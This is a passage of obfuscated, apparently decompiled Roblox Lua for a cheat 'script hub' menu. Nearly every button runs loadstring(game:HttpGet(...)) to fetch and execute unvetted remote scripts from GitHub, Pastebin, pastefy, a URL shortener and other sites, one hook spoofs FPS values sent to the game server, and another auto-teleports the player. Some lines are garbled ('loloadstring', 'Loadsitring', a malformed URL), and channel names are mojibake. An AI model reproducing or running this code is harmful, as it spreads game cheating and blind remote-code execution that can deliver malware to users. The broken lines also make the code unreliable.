v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 ANIME-SPIRITS"):Button("Enable OMGHUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
    vu1:Notification("Notification", "OMGHub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143 \226\128\162 ONE FRUIT"):Button("Enable NexusHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CrazyHub123/NexusHubMain/main/Main.lua"))()
    vu1:Notification("Notification", "NexusHub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\184\143\226\128\162 Dungeon RNG"):Button("Enable ToraScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/DungeonRNG", true))()
    vu1:Notification("Notification", "ToraScript Activated", "Okay!")
end)
local v54 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Horrors RNG")
v54:Button("Enable Baconboss", function()
    loadstring(game:HttpGet("https://pastefy.app/UhaCeVUj/raw", true))()
    vu1:Notification("Notification", "Baconboss Activated", "Okay!")
end)
v54:Button("Enable RINNS HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
    vu1:Notification("Notification", "Baconboss Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Underground War 2"):Button("Enable RINNS HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
    vu1:Notification("Notification", "Baconboss Activated", "Okay!")
end)
local v55 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Ro ghoul")
v55:Button("Enable Mukuro", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader"))()
    vu1:Notification("Notification", "Mukuro Activated", "Okay!")
end)
v55:Button("Enable ZenHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Roghoul", true))()
    vu1:Notification("Notification", "ZenHub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Camera Tower Defense"):Button("Enable CameraTower", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/CameraTower", true))()
    vu1:Notification("Notification", "CameraTower Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 money simulator z"):Button("Enable awakenkn", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Awakenchan/Misc-Release/main/Money%20Simulator%20Z"))()
    vu1:Notification("Notification", "awakenkn Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 aqua racer"):Button("Enable ToraScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/AquaRacer", true))()
    vu1:Notification("Notification", "ToraScript Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 toilet war tower defense"):Button("Enable ToraScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/ToiletWarTower", true))()
    vu1:Notification("Notification", "ToraScript Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Second Piece"):Button("Enable Cat_Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/barlossxi/CAT_HUB/main/ALLMAP%20CAT%20HUB.txt"))()
    vu1:Notification("Notification", "Cat_Hub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Restaurant Tycoon 2"):Button("Enable Zeld-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/iz037/Zeld-Hub/main/Script/Restaurant%20Tycoon%202.lua"))()
    vu1:Notification("Notification", "Zeld-Hub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Murder Vs Sheriff"):Button("Enable Murder Vs Sheriff", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bxEUA4eU"))()
    vu1:Notification("Notification", "Murder Vs Sheriff Activated", "Okay!")
end)
local v56 = v4:Channel("\239\191\189\239\191\189 \226\128\162 Ninja Legends")
v56:Button("Enable Proxima-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
    vu1:Notification("Notification", "Proxima-Hub Activated", "Okay!")
end)
v56:Button("Enable SkyHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/arlists/Sky-Hub/main/Main", true))()
    vu1:Notification("Notification", "SkyHub Activated", "Okay!")
end)
v56:Button("Enable Ninja Legends", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/8Ts5pEiA"))()
    vu1:Notification("Notification", "Ninja Legends Activated", "Okay!")
end)
v56:Button("Enable TerrorHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Tropxzz/Terror/main/Games/NinjaLegends.lua", true))()
    vu1:Notification("Notification", "TerrorHub Activated", "Okay!")
end)
local v57 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\162 Slap-Battles")
v57:Button("Enable Slap-Battles", function()
    loadstring(game:HttpGet("https://pastefy.app/Ty7G6BXs/raw"))()
    vu1:Notification("Notification", "Slap-Battles Activated", "Okay!")
end)
v57:Button("Enable Slap-Battles", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Slap-Battles-Open-source-for-9484"))()
    vu1:Notification("Notification", "Slap-Battles Activated", "Okay!")
end)
v57:Button("Enable Giangplay", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua"))()
    vu1:Notification("Notification", "Giangplay Activated", "Okay!")
end)
v57:Button("Enable DestroyerX", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Aquoupi/DestroyerX/main/DestroyerX"))()
    vu1:Notification("Notification", "DestroyerX Activated", "Okay!")
end)
v57:Button("Enable slap-god", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/slap-god/main/script"))()
    vu1:Notification("Notification", "slap-god Activated", "Okay!")
end)
local v58 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Infection Smile")
v58:Button("Enable Nicuse", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/InfectiousSmile.lua", true))()
    vu1:Notification("Notification", "Nicuse Activated", "Okay!")
end)
v58:Button("Enable Infection Smile", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/TqgbdDjF"))()
    vu1:Notification("Notification", "Infection Smile Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 my restaurant"):Button("Enable SpencerDevv", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/SpencerDevv/33683ac31b7e2621b90b9a3b39a3155c/raw/9d4fd60202457cacb17871e5d18b3654bdd344e6/betaV8"))()
    vu1:Notification("Notification", "SpencerDevv Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Death-Ball"):Button("Enable LOLking123456", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Death/main/Ball"))()
    vu1:Notification("Notification", "LOLking123456 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 MadCity"):Button("Enable RubyHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Deni210/main/main/RubyHub.lua", true))()
    vu1:Notification("Notification", "RubyHub Activated", "Okay!")
end)
local v59 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Zombie-Attack")
v59:Button("Enable Unfair-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua", true))()
    vu1:Notification("Notification", "Unfair-Hub Activated", "Okay!")
end)
v59:Button("Enable Voidz", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua", true))()
    vu1:Notification("Notification", "Voidz Activated", "Okay!")
end)
v59:Button("Enable Unknown-ZombieAttack", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownproooolucky/Unknown-ZombieAttack/main/Gui.lua"))()
    vu1:Notification("Notification", "Unknown-ZombieAttack Activated", "Okay!")
end)
v4:Channel(" \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Zombie-Rush"):Button("Enable OwlHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
    vu1:Notification("Notification", "Zombie-Rush Activated", "Okay!")
end)
v4:Channel(" \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Shark-Bite2"):Button("Enable sharkbite2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Luces245434/script/main/sharkbite2"))()
    vu1:Notification("Notification", "sharkbite2 Activated", "Okay!")
end)
v4:Channel(" \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 BETTER MUSIC"):Button("Enable Bac0nHck", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BetterMusic"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Bac0nHck Activated", "Okay!")
end)
local v60 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 tower-of-hell")
v60:Button("Enable tower-of-hell", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/BbVHjH56"))()
    vu1:Notification("Notification", "tower-of-hell Activated", "Okay!")
end)
v60:Button("Enable BloxiYT", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/BloxiYT/85f97364b6367baac677e109488c9905/raw/c2972a2b892c4193509ddb2fe1ba3061435e1a8a/gistfile1.txt"))()
    vu1:Notification("Notification", "BloxiYT Activated", "Okay!")
end)
v60:Button("Enable ZeeroxHub", function()
    loloadstring(game:HttpGet("https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua"))()
    vu1:Notification("Notification", "ZeeroxHub Activated", "Okay!")
end)
local v61 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Break In Story")
v61:Button("Enable Proxima-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
    vu1:Notification("Notification", "Proxima-Hub Activated", "Okay!")
end)
v61:Button("Enable ScriptHub(OP)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/opbreakinscripts/main/opbreakinscripts", true))()
    vu1:Notification("Notification", "ScriptHub(OP) Activated", "Okay!")
end)
v61:Button("Enable Break1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nitropitro/Break1/main/Break1"))()
    vu1:Notification("Notification", "Break1 Activated", "Okay!")
end)
local v62 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Hoopz")
v62:Button("Enable VSam\'s Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/hoopz/main/hoopz", true))()
    vu1:Notification("Notification", "VSam\'s Hub Activated", "Okay!")
end)
v62:Button("Enable Voidz", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RTrade/Voidz/main/Games.lua", true))()
    vu1:Notification("Notification", "Voidz Activated", "Okay!")
end)
local v63 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 the rake remastered")
v63:Button("Enable rblxhub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/rblxscriptnet/unfair/main/rblxhub.lua", true))()
    vu1:Notification("Notification", "rblxhub Activated", "Okay!")
end)
v63:Button("Enable CHEATERFUN", function()
    Loadsitring(game:HttpGet("https:llraw.githubusercontent.com/CHEATERFUN/The-Rake-REAMASTERED-script/mais/Source.lua"))()
    vu1:Notification("Notification", "CHEATERFUN Activated", "Okay!")
end)
v63:Button("Enable realzzhub", function()
    loadstring(game:HttpGet("https://realzzhub.xyz/script.lua"))()
    vu1:Notification("Notification", "realzzhub Activated", "Okay!")
end)
v63:Button("Enable Zeerox Hub", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/RrGAQXi0"))()
    vu1:Notification("Notification", "Zeerox Hub Activated", "Okay!")
end)
v63:Button("Enable RakeEvolved", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/RakeEvolved/Stable/Source.lua"))()
    vu1:Notification("Notification", "RakeEvolved Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 CRIMINALITY"):Button("Enable FemBoyhubCrim", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/FemBoyhubCrim/main/Criminality"))()
    vu1:Notification("Notification", "FemBoyhubCrim Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Fruit Battlegrounds"):Button("Enable Askien-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KirillEee/Askien-Hub/main/Fruit%20Battlegrounds"))()
    vu1:Notification("Notification", "Askien-Hub Activated", "Okay!")
end)
local v64 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 pressure")
v64:Button("Enable Bedol-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/New-C4-Remote.lua/main/pressure_kuy.lua"))()
    vu1:Notification("Notification", "Bedol-Hub Activated", "Okay!")
end)
v64:Button("Enable NewCMain", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yumiara/NewCMain/main/Main.lua"))()
    vu1:Notification("Notification", "NewCMain Activated", "Okay!")
end)
v64:Button("Enable Fire-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Fire-Hub/main/Loader"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Fire-Hub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Rock Fruit"):Button("Enable Omgshit", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
    vu1:Notification("Notification", "Omgshit Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Basketball-Legends"):Button("Enable notxkid", function()
    getgenv().greenNumber = 72.34
    getgenv().unlockfps = true
    getgenv().keytoclick = "E"
    getgenv().customautogreen = Enum.KeyCode.R
    loadstring(game:HttpGet("https://raw.githubusercontent.com/notxkid/scriptsbecauseimbored/main/basketballlegends.lua"))()
    vu1:Notification("Notification", "notxkid Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 FF2"):Button("Enable Horizon.cc", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Zypher32/Horizon.cc/main/loader"))()
    vu1:Notification("Notification", "Horizon.cc Activated", "Okay!")
end)
local v65 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 TPS:STREET SOCCER")
v65:Button("Enable votelhub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/189hi771/votelhub/main/mainscript.lua"))()
    vu1:Notification("Notification", "votelhub Activated", "Okay!")
end)
v65:Button("Enable xfaz", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xfaz/gamecheck/main/hub", true))()
    vu1:Notification("Notification", "xfaz Activated", "Okay!")
end)
v65:Button("Enable ByteHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DamThien332/TPS-Script/main/Main-ByteHub.lua"))()
    vu1:Notification("Notification", "ByteHub Activated", "Okay!")
end)
local v66 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 GreenVille")
v66:Button("Enable Marco8643", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8643/test/main/green"))()
    vu1:Notification("Notification", "Marco8643 Activated", "Okay!")
end)
v66:Button("Enable Lightux", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cool83birdcarfly02six/Lightux/main/README.md", true))()
    vu1:Notification("Notification", "Lightux Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Flex-Your-FPS"):Button("Enable TheRealX_ORA", function()
    math.randomseed(os.time())
    local vu67 = nil
    vu67 = hookmetamethod(game, "__namecall", function(p68, ...)
        local v69 = {
            ...
        }
        if getnamecallmethod():lower() ~= "fireserver" or (string.lower(p68.Name) ~= "updatefps" or type(v69[1]) ~= "number") then
            return vu67(p68, ...)
        end
        v69[1] = math.random(500, 3500)
        return vu67(p68, unpack(v69))
    end)
    vu1:Notification("Notification", "TheRealX_ORA Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Pistol 1V1"):Button("Enable Pistol 1V1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RSOscrip/09/main/Pistol%201v1"))()
    vu1:Notification("Notification", "Pistol 1V1 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Taxi-Boss"):Button("Enable Marco8642", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/Taxi%20Boss", true))()
    vu1:Notification("Notification", "Marco8642 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 who_is_spy"):Button("Enable TheExploiterBoy", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheExploiterBoy/New-Script/main/who_is_spy"))()
    vu1:Notification("Notification", "TheExploiterBoy Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 rate-my-avatar"):Button("Enable rate-my-avatar", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bRnFqhqw"))()
    vu1:Notification("Notification", "rate-my-avatar Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Hoop-Nation"):Button("Enable DepHub1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DepHubHolder/DepHub1/main/Loader1"))()
    vu1:Notification("Notification", "DepHub1 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Realistic-basketball"):Button("Enable DepHub1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DepHubHolder/DepHub1/main/Loader1"))()
    vu1:Notification("Notification", "DepHub1 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Realistic-Street-soccer"):Button("Enable DepHub1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DepHubHolder/DepHub1/main/Loader1"))()
    vu1:Notification("Notification", "DepHub1 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Shinobi-Strom"):Button("Enable Shinobi-Strom", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/2RFgrskR"))()
    vu1:Notification("Notification", "Shinobi-Strom Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Gorilla-tag"):Button("Enable Gorilla-tag", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/vhtR4Vdu"))()
    vu1:Notification("Notification", "Gorilla-tag Activated", "Okay!")
end)
local v70 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Warrior-Simulator")
v70:Button("Enable Warrior-Sim", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenniel123/Warrior-Simulator/main/Warrior%20Simulator%20Fluent"))()
    vu1:Notification("Notification", "Warrior-Sim Activated", "Okay!")
end)
v70:Button("Enable DKHUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Christian2703/Main/main/Mainscript", true))()
    vu1:Notification("Notification", "DKHUB Activated", "Okay!")
end)
local v71 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Word-Bomb")
v71:Label("EXECUTE EACH ROUND")
v71:Button("Enable forgebin", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/forgebin/roblox/main/wordbomb.lua"))()
    vu1:Notification("Notification", "forgebin Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Animal-Attack"):Button("Enable Bac0nHck", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/AnimalAttack"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Bac0nHck Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 frontlines"):Button("Enable Thunder Client", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5bebf0b1e173f4baff73449722204837.lua"))()
    vu1:Notification("Notification", "Thunder Client Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 race-clicker"):Button("Enable race-clicker", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/HecAyid9"))()
    vu1:Notification("Notification", "race-clicker Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Sky-Wars"):Button("Enable 2dgeneralspam1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/Loadstring9VHD6Wmyi82n", true))
    vu1:Notification("Notification", "2dgeneralspam1 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Jujutsu-Shenanigans"):Button("Enable LOLking123456", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Jujutsu/main/Shenanigans"))()
    vu1:Notification("Notification", "LOLking123456 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Wild-West"):Button("Enable Wild-West", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Playeranimalore-esp-(Open-Source)_251"))()
    vu1:Notification("Notification", "Wild-West Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Survive-the-killer"):Button("Enable Kiroftt", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kiroftt/Survive-The-Killer/main/Simple"))()
    vu1:Notification("Notification", "Kiroftt Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 fling-things-and-people"):Button("Enable BlizTBr", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))()
    vu1:Notification("Notification", "BlizTBr Activated", "Okay!")
end)
local v72 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Phantom-forces")
v72:Button("Enable Phantom-forces", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
    vu1:Notification("Notification", "Phantom-forces Activated", "Okay!")
end)
v72:Button("Enable ThunderClientForSolara", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderScriptSolutions/ThunderClientForSolara/main/ThunderClientGameSupport"))()
    vu1:Notification("Notification", "ThunderClientForSolara Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 ro-ghoul"):Button("Enable ZenHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MASTER8245/ZenHub/main/LoaderV3"))()
    vu1:Notification("Notification", "ZenHub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Car-Crusher-2"):Button("Enable CatHub", function()
    loadstring(game:HttpGet("https://whimper.xyz/cathub.lua"))()
    vu1:Notification("Notification", "CatHub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Epic-Minigames"):Button("Enable SlamminPig", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SlamminPig/rblxgames/main/Epic%20Minigames/EpicMinigamesGUI"))()
    vu1:Notification("Notification", "SlamminPig Activated", "Okay!")
end)
local v73 = v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Piggy")
v73:Button("Enable Vynixius", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Piggy-BREAKOUT-CHAPTER-Vynixius-4914"))()
    vu1:Notification("Notification", "Vynixius Activated", "Okay!")
end)
v73:Button("Enable Item Gui", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Piggy-Roblox-Script-V1-15877"))()
    vu1:Notification("Notification", "Item Gui Activated", "Okay!")
end)
v73:Button("Enable Piggy [Item Grabber]", function()
    loadstring(game:HttpGet("https://encurtador.com.br/fiyFJ"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Piggy [Item Grabber] Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Farm-for-fun"):Button("Enable FarmforFun", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/FarmforFun"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "FarmforFun Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 The-Dropper"):Button("Enable AutoFarm", function()
    local v74 = game:GetService("Workspace")
    local v75 = game.Players.LocalPlayer
    while wait(2) do
        local v76, v77, v78 = pairs(v74:GetChildren())
        while true do
            local v79
            v78, v79 = v76(v77, v78)
            if v78 == nil then
                break
            end
            if v79:IsA("Folder") and v79.Name ~= "Lobby" then
                local v80 = v79:FindFirstChild("End")
                if v80 and v75.Character and v75.Character:FindFirstChild("HumanoidRootPart") then
                    v75.Character.HumanoidRootPart.CFrame = v80.CFrame
                end
            end
        end
    end
    vu1:Notification("Notification", "The-Dropper Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 five nights TD"):Button("Enable DemonicHub_V2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
    vu1:Notification("Notification", "DemonicHub_V2 Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 saiyan battle grounds"):Button("Enable Oxyhub", function()
    loadstring(game:HttpGet("https://pastefy.app/o3Xinalb/raw"))()
    vu1:Notification("Notification", "Oxyhub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 push up training simulator"):Button("Enable Kyokasuigetsu", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Vylo-dev/SoulSociety/main/Kyokasuigetsu"))()
    vu1:Notification("Notification", "Kyokasuigetsu Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 ability wars tower defence"):Button("Enable ZhenX", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZhenX201/Fe-Admin-PaneI/main/lua"))()
    vu1:Notification("Notification", "ZhenX Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Demon Sword Reincarnation"):Button("Enable dkhub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ByNami/dkhub/main/Script", true))("t.me/arceusxscripts")
    vu1:Notification("Notification", "dkhub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 The Mimic"):Button("Enable Kitsune-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RileyBeeRBLX4/Kitsune-Hub/main/TheMimic.lua"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Kitsune-Hub Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 ADustyTrip"):Button("Enable ADustyTrip", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/ADustyTrip", true))("More scripts: t.me/arceusxscripts")
    vu1:Notification("Notification", "ADustyTrip Activated", "Okay!")
end)
v4:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 Dress To Impress"):Button("Enable DTI-GUI-V2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/DTI-GUI-V2/main/dti_gui_v2.lua", true))("t.me/arceusxscripts")
